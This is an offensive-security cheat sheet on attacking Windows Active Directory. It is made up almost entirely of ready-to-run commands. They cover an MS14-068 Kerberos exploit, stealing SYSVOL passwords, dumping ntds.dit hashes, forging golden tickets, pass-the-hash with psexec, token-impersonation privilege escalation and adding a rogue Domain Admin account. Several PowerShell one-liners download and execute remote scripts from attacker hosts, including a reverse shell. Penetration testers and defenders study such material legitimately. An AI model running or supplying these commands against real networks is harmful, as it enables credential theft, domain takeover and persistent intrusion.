# Active Directory Attacks

## Tools

* [Impacket](https://github.com/CoreSecurity/impacket)
* [Responder](https://github.com/SpiderLabs/Responder)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Ranger](https://github.com/funkandwagnalls/ranger)
* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
```powershell
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
```

## Most common paths to AD compromise

### MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)
```bash
Exploit Python: https://www.exploit-db.com/exploits/35474/
Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum

git clone https://github.com/bidord/pykek
python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
```


### GPO - Pivoting with Local Admin & Passwords in SYSVOL
:triangular_flag_on_post:	 GPO Priorization : Organization Unit > Domain > Site > Local

Find password in SYSVOL
```powershell
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

Metasploit modules to enumerate shares and credentials
```c
scanner/smb/smb_enumshares
windows/gather/enumshares
windows/gather/credentials/gpp
```

List all GPO for a domain 
```powershell
Get-GPO -domaine DOMAIN.COM -all
Get-GPOReport -all -reporttype xml --all

Powersploit:
Get-NetGPO
Get-NetGPOGroup
```


### Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)
```c
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit

or

vssadmin create shadow /for=C :
Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
```
then you need to use secretsdump to extract the hashes
```c
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```


Metasploit module
```c
windows/gather/credentials/domain_hashdump
```


PowerSploit module
```
Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
```

### Golden Tickets    
Mimikatz version
```powershell
Get info - Mimikatz
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt

Forge a Golden ticket - Mimikatz
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

Meterpreter version
```c
Get info - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

Forge a Golden ticket - Meterpreter
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```

### Silver Tickets
### Trust Tickets


### Kerberoast
```c
https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
https://room362.com/post/2016/kerberoast-pt1/
```

### Pass-the-Hash 
Note: the password can be replaced by a hash to execute a `pass the hash` attack.
```c
use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser jarrieta
set SMBPass nastyCutt3r 
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

### OverPass-the-Hash (pass the key)

### Dangerous Built-in Groups Usage
AdminSDHolder
```powershell
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
or 
([adsisearcher]"(AdminCount=1)").findall()
```



## Privilege Escalation
### PrivEsc Local Admin - Token Impersonation (RottenPotato)
Binary available at : https://github.com/foxglovesec/RottenPotato      
Binary available at : https://github.com/breenmachine/RottenPotatoNG   
```c
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```


### PrivEsc Local Admin - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
```
Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```


### PrivEsc Local Admin - MS17-010 (Eternal Blue)
```c
nmap -Pn -p445 — open — max-hostgroup 3 — script smb-vuln-ms17–010 <ip_netblock>
```

### From Local Admin to Domain Admin
```powershell
net user hacker2 hacker123 /add /Domain
net group "Domain Admins" hacker2 /add /domain
```


## Thanks to
 * [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
 * [Road to DC](https://steemit.com/infosec/@austinhudson/road-to-dc-part-1)
 * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
 * [Golden ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)
